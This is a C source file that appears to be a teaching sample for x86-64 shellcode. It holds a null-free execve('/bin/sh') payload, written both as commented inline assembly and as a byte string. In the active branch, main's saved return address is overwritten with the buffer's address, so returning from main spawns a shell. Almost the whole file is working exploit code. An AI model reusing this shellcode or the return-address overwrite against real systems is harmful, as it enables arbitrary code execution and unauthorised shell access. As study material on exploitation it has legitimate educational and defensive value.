#undef ASSEMBLY

int main(int argc, char **argv)
{
	int ret = 0;

#if defined(ASSEMBLY)
	__asm__("lea 0x11111139(%rip),%rax");   /* load 'call' block address */
	__asm__("sub $0x11111111,%rax");        /* to $rax. Note: $rip is
	                                           that of the next op       */
	__asm__("jmp *%rax");                   /* jmp to 'call' block       */
	__asm__("xor %rax,%rax");               /* zero out $rax register    */
	__asm__("movq %rax,0x8(%rsp)");         /* terminate execve's argv
	                                           array with a NULL         */
	__asm__("mov 0x0(%rsp),%rdi");          /* set string address as
	                                           execve's 1st param        */
	__asm__("mov %rsp,%rsi");               /* set argv array address as
	                                           execve's 2nd param        */
	__asm__("mov 0x8(%rsp),%rdx");          /* set the same NULL that
	                                           terminates the argv array
	                                           as the envp NULL pointer
	                                           for execve's 3rd param    */
	__asm__("mov $0x1111114c,%eax");        /* set 0x1111114c - execve's */
	__asm__("sub $0x11111111,%eax");        /* system call id in $eax    */
	__asm__("syscall");                     /* execute the system call   */
	__asm__("lea -0x27(%rip),%rax");        /* prepare to call back to
	                                           after the jmp instruction */
	__asm__("callq *%rax");                 /* call back to after the
	                                           jmp instruction           */
	__asm__(".string \"/bin/sh\"");         /* execution string for
	                                           execve                    */
#else
	char my_execve[] =
		"\x48\x8d\x05\x39\x11\x11\x11"  /* lea 0x11111139(%rip),%rax */
		"\x48\x2d\x11\x11\x11\x11"      /* sub    $0x11111111,%rax   */
		"\xff\xe0"                      /* jmpq   *%rax              */
		"\x48\x31\xc0"                  /* xor    %rax,%rax          */
		"\x48\x89\x44\x24\x08"          /* mov    %rax,0x8(%rsp)     */
		"\x48\x8b\x3c\x24"              /* mov    (%rsp),%rdi        */
		"\x48\x89\xe6"                  /* mov    %rsp,%rsi          */
		"\x48\x8b\x54\x24\x08"          /* mov    0x8(%rsp),%rdx     */
		"\xb8\x4c\x11\x11\x11"          /* mov    $0x1111114c,%eax   */
		"\x2d\x11\x11\x11\x11"          /* sub    $0x11111111,%eax   */
		"\x0f\x05"                      /* syscall                   */
		"\x48\x8d\x05\xd9\xff\xff\xff"  /* lea    -0x27(%rip),%rax   */
		"\xff\xd0"                      /* callq  *%rax              */
		"\x2f\x62\x69\x6e\x2f\x73\x68"  /* .string \"/bin/sh\"       */
		"\x00"
		;
	*(((unsigned long*)(&ret + 1)) + 1) = (unsigned long)my_execve;
#endif
	return ret;
}

